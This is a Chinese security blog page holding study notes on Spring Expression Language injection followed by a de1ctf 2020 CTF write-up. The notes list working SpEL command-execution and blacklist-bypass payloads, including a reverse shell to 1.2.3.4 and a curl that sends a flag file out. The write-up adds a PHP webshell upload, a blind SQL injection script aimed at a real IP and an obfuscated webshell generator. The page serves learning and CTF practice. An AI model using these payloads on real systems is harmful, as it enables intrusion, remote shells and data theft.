<h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;name&quot;);

EvaluationContext context = new StandardEvaluationContext(tesla);
String name = (String) exp.getValue(context);</code></pre>
<p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p>
<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;name&quot;);
String name = (String) exp.getValue(tesla);</code></pre>
<h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();

// Inventions Array
StandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);

// evaluates to &quot;Induction motor&quot;
String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(
        teslaContext, String.class);

// Members List
StandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);

// evaluates to &quot;Nikola Tesla&quot;
String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(
        societyContext, String.class);

// List and Array navigation
// evaluates to &quot;Wireless communication&quot;
String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(
        societyContext, String.class);</code></pre>
<p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p>
<pre><code class="java">// Officer&#39;s Dictionary

Inventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(
        societyContext, Inventor.class);

// evaluates to &quot;Idvor&quot;
String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(
        societyContext, String.class);

// setting values
parser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(
        societyContext, &quot;Croatia&quot;);</code></pre>
<h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p>
<pre><code class="java">// evaluates to a Java list containing the four numbers
List numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);

List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre>
<p>字典：</p>
<pre><code class="java">// evaluates to a Java map containing the two entries
Map inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);

Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre>
<p>数组：</p>
<p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p>
<pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre>
<h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p>
<p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  *<em>T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 *</em></p>
<pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);

Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);

boolean trueValue = parser.parseExpression(
        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)
        .getValue(Boolean.class);</code></pre>
<h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p>
<pre><code class="java">String randomPhrase = parser.parseExpression(
        &quot;random number is #{T(java.lang.Math).random()}&quot;,
        new TemplateParserContext()).getValue(String.class);</code></pre>
<p>结果：<code>random number is xxxx</code></p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p>
<h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p>
<h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p>
<h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)
T(Thread).sleep(10000)
#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)
new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>利用反射构造绕过黑名单</p>
<pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>利用ScriptEngineManager构造绕过黑名单</p>
<pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()
    .getEngineByName(&quot;nashorn&quot;)
        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre>
<pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]
    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]
        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]{,,...})</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p>
<pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p>
<h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p>
<ul>
<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
</ul>
<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p>
<p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p>
<p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  文档</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/06/SpEL表达式注入漏洞/">http://blog.ccreater.top/2020/05/06/SpEL表达式注入漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr22000iv4v0a3rqb815" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-de1ctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/06/de1ctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-05-06T07:11:32.852Z" itemprop="datePublished">2020-05-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/06/de1ctf2020/">de1ctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="de1ctf-2020"><a href="#de1ctf-2020" class="headerlink" title="de1ctf 2020"></a>de1ctf 2020</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><pre><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</code></pre><p>测试发现：禁止ph结尾后缀，但是可以上传.htaccess</p>
<p>上传.htaccess</p>
<pre><code>AddType application/x-httpd-p\
hp .jpg</code></pre><p>上传test.jpg</p>
<pre><code class="php">&lt;?=eval($_POST[0]);</code></pre>
<pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a><strong>mixture</strong></h2><pre><code>index.php
profile.php
select.php
member.php
admin.php
logout.php</code></pre><p>除了admin其他用户不会检查密码</p>
<p>神奇的注释</p>
<pre><code>index.php:&lt;!------ Include the above in your HEAD tag ----------&gt;
member.php:&lt;!--orderby--&gt;</code></pre><p>后来学长说member.php的orderby参数可以注入，我是有点不信的，后来想想自己没测出来也是正常的：</p>
<ol>
<li>我不知道orderby会将输入放在sql语句的位置</li>
<li>不知道有没有waf，无法确认waf是否存在</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505122140.png" alt="image697"></p>
<p>。。。我应该fuzz一下的</p>
<p>黑名单：</p>
<pre><code>if
union</code></pre><p>最后的payload:</p>
<pre><code class="sql">http://134.175.185.244/member.php?orderby=AND case when (ASCII(SUBSTRING((SELECT USER()),1,1)))=1 then BENCHMARK(100000,MD5(NOW())) ELSE 2 END</code></pre>
<p>盲注脚本：</p>
<pre><code class="python">import requests
import time
#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid

#待求数据大于num
def bigger(num):
    return sqlinj(num)
def less(num):
    pass
def equal(num):
    pass

def sqlinj(num):

    burp0_url = &quot;http://134.175.185.244:80/member.php&quot;
    param={&quot;orderby&quot;:&quot;AND case when (ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()),{POS},1)))&gt;{GUESS} then BENCHMARK(100000,MD5(NOW())) ELSE 2 END&quot;.format(POS=pos,GUESS=num)}
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;p781mlp8a9sp3ggrf1solslvn3&quot;}
    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    try :
        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param,timeout=2)
    except Exception:
        return True
    print(&quot;test &quot;,num)
    return False


result=&quot;&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<pre><code>member,users
users:id,username,money
member:id,username,password
admin 18a960a3a0b3554b314ebe77fe545c85</code></pre><p>在cmd5上找到密码： goodlucktoyou </p>
<p>打开admin是一个phpinfo</p>
<p>search是一个类似文件包含的东东</p>
<p>但是很多都不行如/etc/passwd等等</p>
<p>fuzz后得到源码</p>
<p>select.php</p>
<pre><code class="php">&lt;?php
include &quot;profile.php&quot;;
$search = $_POST[&#39;search&#39;];

if($_SESSION[&#39;admin&#39;]==1){
    print &lt;&lt;&lt;EOT
&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;
        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;
    &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
    &lt;/div&gt;
&lt;/form&gt;
EOT;
}
else{
    print &lt;&lt;&lt;EOT
  &lt;div class=&quot;container&quot;&gt; 
      &lt;div class=&quot;row&quot;  &gt;            
              &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;             
                &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt;                                                       
                            &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;
                              &lt;/span&gt;

                &lt;/div&gt;&lt;!-- /input-group --&gt;              
              &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt; 
      &lt;/div&gt;
  &lt;/div&gt;
EOT;
}
if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){
    //var_dump(urldecode($search));
    Minclude(urldecode($search));
    //lookup($search);
}
</code></pre>
<p>admin.php</p>
<pre><code class="php">&lt;?php
include &quot;profile.php&quot;;
session_start();
if(empty($_SESSION[&#39;user&#39;])){
    header(&quot;location: index.php&quot;);
}
if($_SESSION[&#39;admin&#39;]==1){
    phpinfo();
}
else{
    print &lt;&lt;&lt;EOT
&lt;div class=&quot;row&quot;&gt;
  &lt;div class=&quot;col-md-6 col-md-offset-4&quot;&gt;You are not admin!!!!&lt;/div&gt;
&lt;/div&gt;
EOT;

}</code></pre>
<p>member.php</p>
<pre><code class="php">&lt;?php
include &quot;profile.php&quot;;
include &quot;config.php&quot;;
$orderby = $_GET[&#39;orderby&#39;];
?&gt;

    &lt;?php
    print &lt;&lt;&lt;EOT
&lt;div class=&quot;table-responsive&quot;&gt;
    &lt;table class=&quot;table&quot;&gt;
        &lt;!--orderby--&gt;
        &lt;caption&gt;ALLmember&lt;/caption&gt;
        &lt;thead&gt;
        &lt;tr&gt;
            &lt;th&gt;id&lt;/th&gt;
            &lt;th&gt;username&lt;/th&gt;
            &lt;th&gt;money&lt;/th&gt;&lt;/tr&gt;
        &lt;/thead&gt;
        &lt;tbody&gt;
EOT;
    if(!empty($orderby)){
        $blacklist = &quot;/if|desc|sleep|rand|updatexml|\^|union|\|\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i&quot;;
        if(preg_match($blacklist, $orderby))
            exit(&quot;No~~hacker!&quot;);
        $sql = &quot;SELECT * FROM users order by id &quot;.$orderby;
        $result = $mysqli-&gt;query($sql);
        if($result===false){
            $sql=&quot;SELECT * FROM users&quot;;
        }
    }
    else{
        $sql = &quot;SELECT * FROM users&quot;;
    }
        $result = $mysqli-&gt;query($sql);
        /* free result set */
        while($row = $result-&gt;fetch_row()){
            //var_dump($row);
            print &lt;&lt;&lt;EOT
        &lt;tr&gt;
            &lt;td&gt;$row[0]&lt;/td&gt;
            &lt;td&gt;$row[1]&lt;/td&gt;
            &lt;td&gt;$row[2]&lt;/td&gt;&lt;/tr&gt;
        &lt;tr&gt;
EOT;
        }
        $result-&gt;free();
        $mysqli-&gt;close();
    print &lt;&lt;&lt;EOT
      &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/div&gt;
EOT;</code></pre>
<p>index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
include &quot;config.php&quot;;
session_start();
if(!empty($_SESSION[&#39;user&#39;])){
    header(&quot;location: /profile.php&quot;);
}
    session_start();
    $username = $_POST[&#39;username&#39;];
    $password = $_POST[&#39;password&#39;];
    if(!empty($username)&amp;&amp;!empty($password)){
        if($username===&#39;admin&#39;)
            {
                $sql = &quot;select password from member&quot;;
                $result = $mysqli-&gt;query($sql);
                $row = $result-&gt;fetch_row();
                if($row[0]===md5($password)){
                    $_SESSION[&#39;user&#39;]=&#39;admin&#39;;
                    $_SESSION[&#39;admin&#39;]=1;
                    header(&quot;location: /profile.php&quot;);
                }
                else{
                    echo &quot;&lt;script&gt;alert(&#39;nononon,admin password not right&#39;)&lt;/script&gt;&quot;;
                }
            }
        else{
            $_SESSION[&#39;user&#39;]=&#39;guest&#39;;
            $_SESSION[&#39;admin&#39;]=0;
            header(&quot;location: /profile.php&quot;);
        }
    }
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;profile&lt;/title&gt;
    &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;
    &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;
    &lt;style&gt;
        .fakeimg {
            height: 200px;
            background: #aaa;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;!------ Include the above in your HEAD tag ----------&gt;
&lt;body&gt;
    &lt;div id=&quot;login&quot;&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt;
                &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt;
                    &lt;div id=&quot;login-box&quot; class=&quot;col-md-19&quot;&gt;
                        &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;
                            &lt;h3 class=&quot;text-center text-info&quot;&gt;Login&lt;/h3&gt;
                            &lt;div class=&quot;form-group&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt;
                                &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;form-group&quot;&gt;
                                &lt;label for=&quot;password&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt;
                                &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;form-group&quot;&gt;
                                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
                            &lt;/div&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;</code></pre>
<p>emm,Minclude是什么神奇的东西</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505134518.png" alt="image8380"></p>
<p>fuzz后发现其实是读取内存里的内容</p>
<p>fuzz得到/readflag,从中可知flag在/flag中</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505143547.png" alt="image8517"></p>
<p>但是要运行的话，那就必须拿到shell,还是说flag在这个程序里</p>
<p>现有以下几种想法：</p>
<ol>
<li>利用/proc/xx/cwd/flag来拿到flag但是，fuzz到10000还没有</li>
<li>从内存中直接拿到flag(好像不行)</li>
<li>从程序中拿到flag(不会,也不清楚行不行)</li>
<li>拿到shell(没思路)</li>
<li>Minclude有洞（没找到）</li>
</ol>
<p>再见</p>
<p>em？</p>
<p><code>../../../../../../../../../../../../../../../../../../../../../../../etc/passwd</code></p>
<p>这样也能读取文件，有没有机会文件包含？</p>
<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h2><pre><code class="php">&lt;?php
//Clear the uploads directory every hour
highlight_file(__FILE__);
$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);
@mkdir($sandbox);
@chdir($sandbox);

if($_POST[&quot;submit&quot;]){
    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){
        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
            die($_FILES[&quot;file&quot;][&quot;error&quot;]);
        }
        else{
            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);
            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;
        }
    }
    else{
        echo &quot;Not Allow!&quot;;
    }
}

//内容限制：preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)==false 
//后缀限制：不能为：php，不包含..

function Check(){
    $BlackExts = array(&quot;php&quot;);
    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);

    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp; 
        !in_array($exts, $BlackExts) &amp;&amp; 
        !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {
          return true;
    }
    return false;
}
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>第一步绕过后缀名：.phP</p>
<p>第二步绕过文件内容：</p>
<pre><code class="php">&lt;?php
$a = &#39;A&#39;;
$b = &#39;SYSTEM&#39;;//$b = &#39;readfile&#39;;
$c = &quot;POST&quot;;
$vv = &#39;__&#39;;
$v = &#39;_&#39;;
function fuck($b){
    $data = &#39;&#39;;
    $a = &#39;A&#39;;
    $vv = &#39;__&#39;;
    $v = &#39;_&#39;;
    for ($i = 0; $i &lt; strlen($b); $i++) {
        if (ord($b[$i]) &gt;= ord(&#39;a&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;z&#39;)) {
            $data .= &#39;($&#39; . $v . &#39;=$____),&#39;;
            for ($a = ord(&#39;a&#39;); $a &lt; ord($b[$i]); $a++) {
                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
            }
        } else if (ord($b[$i]) &gt;= ord(&#39;A&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;Z&#39;)) {
            $data .= &#39;($&#39; . $v . &#39;=$___),&#39;;
            for ($a = ord(&#39;A&#39;); $a &lt; ord($b[$i]); $a++) {
                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
            }
        } else {
            $data .= &#39;$&#39; . $v . &#39;=&quot;&#39; . $b[$i] . &#39;&quot;;&#39;;
        }
        $data .= &#39;($&#39; . $vv . &#39;.=$&#39; . $v.&#39;),&#39;;
    }
    return $data;
}
$a=&#39;&lt;?=[($_=[]),($_=@&quot;$_&quot;),($___=$_[(&quot;!&quot;!=&quot;!&quot;)]),($____=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)]),&#39;.fuck($b).&#39;$_____=$__]?&gt;&#39;;//system
$a.=&#39;&lt;?=[($__=&quot;_&quot;),($_=[]),($_=@&quot;$_&quot;),&#39;.fuck($c).&#39;$_]?&gt;&#39;;//_POST
$a.=&#39;&lt;?=[($_____($$__[_]))]?&gt;&#39;;
echo $a;
</code></pre>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre><code>GET /spel/calc?calc=&#39;1&#39;%2b&#39;1&#39; =&gt; 11
GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T07:23:42.244+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1008E: Property or field &#39;length&#39; cannot be found on object of type &#39;java.lang.String&#39; - maybe not public or not valid?&quot;,&quot;path&quot;:&quot;/spel/calc&quot;}</code></pre><p>谷歌一段时间后发现这里使用spel(Spring 表达式语言  Spring Expression Language )来计算的</p>
<p>黑名单：<code>getClass,String,#,new,T(,reader</code></p>
<pre><code>&#39;&#39;.class.forName(&#39;java.l&#39;%2b&#39;ang.Ru&#39;%2b&#39;ntime&#39;).getMethod(&#39;ex&#39;%2b&#39;ec&#39;,&#39;&#39;.class)</code></pre><p>原本想那shell的后来看到OpenRASP,想想还是直接读取文件方便一点</p>
<p>构造payload:</p>
<p><code>neW+java.io.RandomAccessFile(&#39;/flag&#39;,&#39;r&#39;).readLine()</code></p>
<p>SpEL中除了java.lang下的类，其他的类在实例化的是否需要完整的包名</p>
<p>flag:<code>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</code></p>
